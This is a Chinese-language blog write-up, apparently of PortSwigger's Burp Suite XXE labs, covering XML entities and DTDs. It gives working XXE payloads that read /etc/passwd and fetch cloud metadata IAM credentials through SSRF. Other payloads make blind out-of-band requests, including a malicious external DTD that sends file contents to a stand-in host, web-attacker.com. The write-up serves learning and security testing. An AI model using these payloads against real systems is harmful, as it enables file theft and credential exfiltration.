@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>burpsuite靶场XXE - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="burpsuite靶场XXE">
+  <meta property="og:description" content="参考以下文章学习
+https://xz.aliyun.com/t/3357什么是XML？ XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。
+什么是XML实体？ XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。
+什么是文档类型定义(DTD)？ DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。
+什么是XML自定义实体？ XML允许在DTD中自定义实体，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY myentity &#34;my entity value&#34; &gt; ]&gt; 如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。
+什么是XML外部实体？ XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &#34;http://normal-website.com&#34; &gt; ]&gt; URL也可以是使用file伪协议从而加载指定的文件内容，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &#34;file:///path/to/file&#34; &gt; ]&gt; XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。
+使用外部实体利用 XXE 来检索文件 访问产品页面，单击“检查库存”，抓包
+然后就是构造外部实体来查看文件
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt; 将productId数字替换为对外部实体的引用：&amp;xxe;
+利用 XXE 执行 SSRF 攻击 与上题payload类似">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:tag" content="Xxe">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="burpsuite靶场XXE">
+  <meta name="twitter:description" content="参考以下文章学习
+https://xz.aliyun.com/t/3357什么是XML？ XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。
+什么是XML实体？ XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。
+什么是文档类型定义(DTD)？ DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。
+什么是XML自定义实体？ XML允许在DTD中自定义实体，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY myentity &#34;my entity value&#34; &gt; ]&gt; 如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。
+什么是XML外部实体？ XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &#34;http://normal-website.com&#34; &gt; ]&gt; URL也可以是使用file伪协议从而加载指定的文件内容，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &#34;file:///path/to/file&#34; &gt; ]&gt; XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。
+使用外部实体利用 XXE 来检索文件 访问产品页面，单击“检查库存”，抓包
+然后就是构造外部实体来查看文件
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt; 将productId数字替换为对外部实体的引用：&amp;xxe;
+利用 XXE 执行 SSRF 攻击 与上题payload类似">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" /><link rel="prev" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" /><link rel="next" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "burpsuite靶场XXE",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80\/burpsuite%E9%9D%B6%E5%9C%BAxxe\/"
+        },"genre": "posts","keywords": "xxe","wordcount":  296 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80\/burpsuite%E9%9D%B6%E5%9C%BAxxe\/","datePublished": "2024-08-20T22:52:36+08:00","dateModified": "2024-08-20T22:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">burpsuite靶场XXE</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;296 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#什么是xml">什么是XML？</a></li>
+        <li><a href="#什么是xml实体">什么是XML实体？</a></li>
+        <li><a href="#什么是文档类型定义dtd">什么是文档类型定义(DTD)？</a></li>
+        <li><a href="#什么是xml自定义实体">什么是XML自定义实体？</a></li>
+        <li><a href="#什么是xml外部实体">什么是XML外部实体？</a></li>
+      </ul>
+    </li>
+    <li><a href="#使用外部实体利用-xxe-来检索文件">使用外部实体利用 XXE 来检索文件</a></li>
+    <li><a href="#利用-xxe-执行-ssrf-攻击">利用 XXE 执行 SSRF 攻击</a></li>
+    <li><a href="#盲xxe漏洞">盲XXE漏洞</a>
+      <ul>
+        <li><a href="#带外交互的盲-xxe">带外交互的盲 XXE</a></li>
+        <li><a href="#过-xml-参数实体进行带外交互的盲-xxe">过 XML 参数实体进行带外交互的盲 XXE</a></li>
+        <li><a href="#利用盲-xxe-使用恶意外部-dtd-泄露数据">利用盲 XXE 使用恶意外部 DTD 泄露数据</a></li>
+        <li><a href="#利用盲-xxe-通过错误消息检索数据">利用盲 XXE 通过错误消息检索数据</a></li>
+      </ul>
+    </li>
+    <li><a href="#利用-xinclude-检索文件">利用 XInclude 检索文件</a>
+      <ul>
+        <li><a href="#xinclude攻击">XInclude攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#通过图像文件上传利用-xxe">通过图像文件上传利用 XXE</a></li>
+    <li><a href="#通过修改内容类型的-xxe-攻击">通过修改内容类型的 XXE 攻击</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>参考以下文章学习</p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/3357</a>
+</p>
+<h3 id="什么是xml">什么是XML？</h3>
+<p>XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。</p>
+<h3 id="什么是xml实体">什么是XML实体？</h3>
+<p>XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。</p>
+<h3 id="什么是文档类型定义dtd">什么是文档类型定义(DTD)？</h3>
+<p>DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。</p>
+<h3 id="什么是xml自定义实体">什么是XML自定义实体？</h3>
+<p>XML允许在DTD中自定义实体，例如
+<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code>
+如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。</p>
+<h3 id="什么是xml外部实体">什么是XML外部实体？</h3>
+<p>XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如
+<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code>
+URL也可以是使用file伪协议从而加载指定的文件内容，例如
+<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code>
+XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。</p>
+<h2 id="使用外部实体利用-xxe-来检索文件">使用外部实体利用 XXE 来检索文件</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240937174.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240937174.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240937174.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240937174.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240937174.png"
+        title="image-20221224093745138" /></p>
+<p>访问产品页面，单击“检查库存”，抓包</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240940482.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240940482.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240940482.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240940482.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240940482.png"
+        title="image-20221224094010426" /></p>
+<p>然后就是构造外部实体来查看文件</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre><p>将<code>productId</code>数字替换为对外部实体的引用：<code>&amp;xxe</code>;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240948832.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240948832.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240948832.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240948832.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240948832.png"
+        title="image-20221224094837779" /></p>
+<h2 id="利用-xxe-执行-ssrf-攻击">利用 XXE 执行 SSRF 攻击</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240958811.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240958811.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240958811.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240958811.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212240958811.png"
+        title="image-20221224095804768" /></p>
+<p>与上题payload类似</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY ssrf SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34; &gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;stockCheck&gt;&lt;productId&gt;</span>&amp;ssrf;<span style="color:#f92672">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#f92672">&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241002707.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241002707.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241002707.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241002707.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241002707.png"
+        title="image-20221224100213649" /></p>
+<h2 id="盲xxe漏洞">盲XXE漏洞</h2>
+<h3 id="带外交互的盲-xxe">带外交互的盲 XXE</h3>
+<p>在指示的位置插入 Burp Collaborator 子域</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &#34;http://3rvn4mhzwn9pcrg1hihcw1p25tbjz8.oastify.com&#34;&gt;</span> ]&gt;
+</span></span></code></pre></div><p><code>productId</code>用对外部实体的引用 替换数字：<code>&amp;xxe;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241115455.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241115455.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241115455.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241115455.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241115455.png"
+        title="image-20221224111541419" /></p>
+<p>收到响应</p>
+<h3 id="过-xml-参数实体进行带外交互的盲-xxe">过 XML 参数实体进行带外交互的盲 XXE</h3>
+<p>因为常规外部实体被禁用了，所以我们可以尝试使用参数实体，可以这样构造payload</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://q0rv1h251nhi026ofywwp821ssyjm8.oastify.com&#34;&gt; %xxe; ]&gt;
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://q0rv1h251nhi026ofywwp821ssyjm8.oastify.com&#34;&gt;</span> %xxe; ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span style="color:#f92672">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#f92672">&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241121150.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241121150.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241121150.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241121150.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241121150.png"
+        title="image-20221224112100104" /></p>
+<h3 id="利用盲-xxe-使用恶意外部-dtd-泄露数据">利用盲 XXE 使用恶意外部 DTD 泄露数据</h3>
+<p>前面我们讲过可以利用XXE盲打进行带外交互，那么我们同样可以利用这个带外交互传输更多的内容，下面我们来看这样的一个例子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY % exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%exfiltrate;
+</span></span></code></pre></div><p>在本例中，我们首先声明了一个存储了敏感文件/etc/passwd内容的参数实体file，然后又声明了一个参数实体eval，里面又包含了一个参数实体exfiltrate，将参数实体file包含的数据附加在URL中发出带外请求从而泄漏带外数据。为了能成功加载上面内容，需要将内容封装成一个dtd托管在目标服务器上。例如</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+&#34;http://web-attacker.com/malicious.dtd&#34;&gt; %xxe;]&gt;
+</code></pre><p>这样我们就可以成功在目标服务器上加载XXE盲打的payload了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241145167.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241145167.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241145167.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241145167.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241145167.png"
+        title="image-20221224112458862" /></p>
+<p>这题需要读/etc/hostname的内容，继续用dns外带</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241133837.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241133837.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241133837.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241133837.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241133837.png"
+        title="image-20221224113317777" /></p>
+<p>服务端写入这样的内容</p>
+<p>然后请求端写入payload如下，下面的url是恶意 DTD 的 URL，并非dns外带的url</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+&#34;https://exploit-0a3c001a047b5c97c16926a901c000a2.exploit-server.net/xxe.dtd&#34;&gt; %xxe;]&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241140871.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241140871.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241140871.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241140871.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241140871.png"
+        title="image-20221224114008817" /></p>
+<p>成功请求到file</p>
+<h3 id="利用盲-xxe-通过错误消息检索数据">利用盲 XXE 通过错误消息检索数据</h3>
+<p>的时候我们可以通过触发XML解析错误将敏感信息泄漏在报错信息中，例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY % error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%error;
+</span></span></code></pre></div><p>从上面我们能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了，例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>java<span style="color:#f92672">.</span>io<span style="color:#f92672">.</span>FileNotFoundException: <span style="color:#e6db74">/nonexistent/</span><span style="color:#e6db74">root</span>:<span style="color:#e6db74">x</span>:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">0</span><span style="color:#e6db74">:root:/root</span>:<span style="color:#e6db74">/bin/</span>bash
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">daemon</span>:<span style="color:#e6db74">x</span>:<span style="color:#ae81ff">1</span>:<span style="color:#ae81ff">1</span><span style="color:#e6db74">:daemon:/</span>usr<span style="color:#f92672">/</span><span style="color:#e6db74">sbin</span>:<span style="color:#e6db74">/usr/s</span>bin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">bin</span>:<span style="color:#e6db74">x</span>:<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">2</span><span style="color:#e6db74">:bin:/bin</span>:<span style="color:#e6db74">/usr/s</span>bin<span style="color:#f92672">/</span>nologin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>接下来我们通过一道在线靶场来深入理解</p>
+<!-- raw HTML omitted -->
+<p>与上题的payload类似</p>
+<!-- raw HTML omitted -->
